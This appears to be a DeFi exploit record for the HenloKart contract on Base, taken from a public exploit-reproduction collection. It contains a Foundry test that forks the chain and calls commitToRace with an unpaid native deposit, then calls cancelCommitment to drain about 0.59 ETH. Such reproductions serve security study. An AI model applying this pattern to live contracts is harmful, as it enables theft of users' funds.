# [?] HenloKart - Fake Native Deposit And Immediate Cancel

## Summary
Severity: Unknown
Chain: Base
Component: HenloKart
Published: 2025-02-26
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-02/HenloKart_exp.sol
Type: defi-exploit-poc

## Details
Lost: 0.59 ETH

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    IHenloKartV1 private constant henloKart = IHenloKartV1(HENLO_KART);

    function setUp() public {
        uint256 forkBlock = 26_884_275;
        vm.createSelectFork("base", forkBlock);

        fundingToken = address(0);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Historical attack contract");
        vm.label(HENLO_KART, "HenloKart");
        vm.label(HISTORICAL_AGENT, "Historical hamster agent");
        vm.label(HISTORICAL_IMPLEMENTATION, "HenloKart vulnerable implementation");
    }

    function testExploit() public balanceLog {
        uint256 balanceBefore = address(this).balance;

        bytes32 commitmentHash = henloKart.commitToRace(
            address(this),
            HISTORICAL_AGENT,
            address(0),
            0,
            0.01 ether,
            0,
            59
        );
        henloKart.cancelCommitment(commitmentHash);

        assertGt(address(this).balance - balanceBefore, 0.58 ether);
    }

    receive() external payable {}
}
```
